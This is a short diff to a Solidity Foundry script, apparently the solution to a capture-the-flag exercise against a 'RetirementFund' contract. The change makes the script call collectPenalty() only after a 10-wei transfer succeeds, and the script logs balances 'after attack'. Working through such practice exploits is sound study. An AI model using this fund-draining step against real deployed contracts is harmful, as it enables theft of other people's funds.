@@ -28,8 +28,10 @@ contract RetirementScript is Script {
         console.log("RetirementFund balance: ", address(retirement).balance);
         console.log("Beneficiary balance: ", beneficiary.balance);
 
-        address(retirement).call{ value: 10 wei }("");
-        retirement.collectPenalty();
+        (bool isSuccess, ) = address(retirement).call{ value: 10 wei }("");
+        if (isSuccess) {
+            retirement.collectPenalty();
+        }
 
         console.log("After attack: ");
         console.log("RetirementFund balance: ", address(retirement).balance);
